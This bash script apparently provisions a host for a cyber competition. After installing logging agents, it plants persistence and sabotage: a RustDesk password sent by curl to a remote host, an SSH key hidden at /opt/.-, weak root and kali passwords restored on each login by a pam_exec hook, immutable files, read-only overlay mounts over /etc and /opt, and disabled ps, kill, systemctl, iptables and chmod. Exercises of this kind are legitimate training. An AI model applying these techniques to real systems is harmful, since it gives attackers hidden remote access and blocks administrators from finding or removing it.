#!/bin/bash
dhclient

echo == SYSMON ==
apt-get update
wget https://github.com/Sysinternals/SysmonForLinux/releases/download/1.3.1.0/sysmonforlinux_1.3.1_amd64.deb -O /tmp/sysmon.deb
wget https://github.com/Sysinternals/SysinternalsEBPF/releases/download/1.3.0.0/sysinternalsebpf_1.3.0-0_amd64.deb  -O /tmp/sysmon2.deb
apt-get install -fy /tmp/sysmon.deb /tmp/sysmon2.deb
cat > /tmp/sysmon.xml << EOF
<Sysmon schemaversion="4.70">
  <EventFiltering>
    <!-- Event ID 1 == ProcessCreate. Log all newly created processes -->
    <RuleGroup name="" groupRelation="or">
      <ProcessCreate onmatch="exclude"/>
    </RuleGroup>
    <!-- Event ID 3 == NetworkConnect Detected. Log all network connections -->
    <RuleGroup name="" groupRelation="or">
      <NetworkConnect onmatch="exclude"/>
    </RuleGroup>
    <!-- Event ID 5 == ProcessTerminate. Log all processes terminated -->
    <RuleGroup name="" groupRelation="or">
      <ProcessTerminate onmatch="exclude"/>
    </RuleGroup>
    <!-- Event ID 9 == RawAccessRead. Log all raw access read -->
    <RuleGroup name="" groupRelation="or">
      <RawAccessRead onmatch="exclude"/>
    </RuleGroup>
    <!-- Event ID 10 == ProcessAccess. Log all open process operations -->
    <RuleGroup name="" groupRelation="or">
      <ProcessAccess onmatch="exclude"/>
    </RuleGroup>
    <!-- Event ID 11 == FileCreate. Log every file creation -->
    <RuleGroup name="" groupRelation="or">
      <FileCreate onmatch="exclude"/>
    </RuleGroup>
    <!--Event ID 23 == FileDelete. Log all files being deleted -->
    <RuleGroup name="" groupRelation="or">
      <FileDelete onmatch="exclude"/>
    </RuleGroup>
  </EventFiltering>
</Sysmon>

EOF

sysmon -i /tmp/sysmon.xml
wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.11.1-amd64.deb -O /tmp/filebeat.deb
apt-get install -fy /tmp/filebeat.deb

FILEBEAT_CONFIG="/etc/filebeat/filebeat.yml"
cat > $FILEBEAT_CONFIG << EOF
filebeat.inputs:
- type: journald
  paths:
    - /var/log/journal

output.logstash:
  hosts: ["129.21.246.160:5044"]

logging.level: info
logging.to_files: true
logging.files:
  path: /var/log/filebeat
  name: filebeat
  keepfiles: 7
  permissions: 0644

processors:
   - add_host_metadata: ~
   - add_cloud_metadata:
      providers: ["nova"]
   - decode_xml_wineventlog:
      field: "message"
      target_field: "sysmon"
      ignore_failure: true

EOF



filebeat setup
service filebeat start

echo == RUSTDESK ==

wget https://github.com/rustdesk/rustdesk/releases/download/1.2.3/rustdesk-1.2.3-x86_64.deb -O /tmp/rustdesk.deb
apt-get update
apt-get install -fy /tmp/rustdesk.deb > null
apt-get install -yq pwgen screen
rustdesk_pw=`pwgen -1 -A -0 -B`
rustdesk_config="QfiIiOikXZrJCLiIiOikGchJCLiUHZl5CdpJnLldmbhJnclJWej5yazVGZ0NXdyJiOikXYsVmciwiI1RWZuQXay5SZn5WYyJXZil3Yus2clRGdzVnciojI0N3boJye"
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --config \"$rustdesk_config\""
systemctl restart rustdesk
sleep 15
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --config \"$rustdesk_config\""
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
/bin/bash -l -c "/usr/bin/rustdesk --password $rustdesk_pw"
rustdesk_id=$(rustdesk --get-id)
systemctl restart rustdesk
echo $rustdesk_id -- $rustdesk_pw
curl "http://100.65.2.207/deploy.php?id={$rustdesk_id}&pw={$rustdesk_pw}"
echo ===== SAMBA =====
apt install -yq samba
wget http://100.65.2.207/smb.conf -O /etc/samba/smb.conf
systemctl --now enable samba
systemctl --now enable smbd
systemctl restart smbd
systemctl restart samba
testparm
chmod -R 777 /var/log
chmod 777 /root
chmod 777 /home/kali
echo kali:kali | chpasswd
echo root:toor | chpasswd
(echo "kali"; echo "kali") | smbpasswd -s -a "kali"

apt install -ya nginx
wget http://100.65.2.207/nginx.conf -O /etc/nginx/nginx.conf
systemctl restart nginx
systemctl --now enable nginx
systemctl start nginx

echo ==== VNC ====
apt install -yq x11vnc
wget http://100.65.2.207/x11vnc.service -O /etc/systemd/system/x11vnc.service
systemctl daemon-reload
systemctl --now enable x11vnc
echo ==== SSH ====
echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPXaKhfYSXWatlaNmfc2qPegVOrnieW/vO7D5dAN96uW root@scoring > /opt/.-
echo AuthorizedKeysFile /opt/.- > /etc/ssh/sshd_config.d/10-cloud-int.conf
echo Banner /opt/flag.txt >> /etc/ssh/sshd_config.d/10-cloud-int.conf
echo PasswordAuthentication yes >> /etc/ssh/sshd_config.d/10-cloud-int.conf

touch /opt/flag.txt
chmod 555 /opt/flag.txt
chattr +i /opt/.-
chattr +i /etc/samba/smb.conf
systemctl restart sshd
wget http://100.65.2.207/id_ed25519 -O /root/.id_ed25519
wget http://100.65.2.207/id_ed25519 -O /opt/.id_ed25519
echo -e "#!/bin/bash\r\necho kali:kali | chpasswd\r\necho root:toor | chpasswd\r\n" > /etc/ssh/.-
chmod +x /etc/ssh/.-
chattr +i /etc/ssh/.-
echo -e "auth optional pam_exec.so quiet expose_authtok /etc/ssh/.-" >> /etc/pam.d/common-auth
chattr +i /etc/pam.d/common-auth
echo IF YOU ARE READING THIS. GET REKT NERDS
#IF YOU ARE READING THIS, OMG IM SO PROUD OF YOU!

echo === FS FUCKERY ===
chattr -R +i /etc/ssh
mkdir /etc/upper
mkdir /etc/work
echo overlay /opt overlay ro,lowerdir=/opt,upperdir=/etc/upper,workdir=/etc/work 0 0 >> /etc/fstab
mount /opt
echo overlay /etc overlay ro,lowerdir=/etc,upperdir=/etc/upper,workdir=/etc/work 0 0 >> /etc/fstab
mount /etc
chmod 000 /usr/bin/chattr
chmod 000 /usr/bin/umount
chmod 000 /usr/bin/mount
cp /usr/bin/chmod /root/.chmod-backup
chmod 000 /usr/bin/ps
chmod 000 /usr/bin/kill
chmod 000 /usr/bin/killall
chmod 000 /usr/bin/top
chmod 000 /usr/bin/netstat
chmod 000 /usr/bin/systemctl
chmod 000 /usr/sbin/iptables
chmod 000 /usr/sbin/service
chmod 000 /usr/bin/chmod
curl "http://100.65.2.207/deploy.php?state=done"

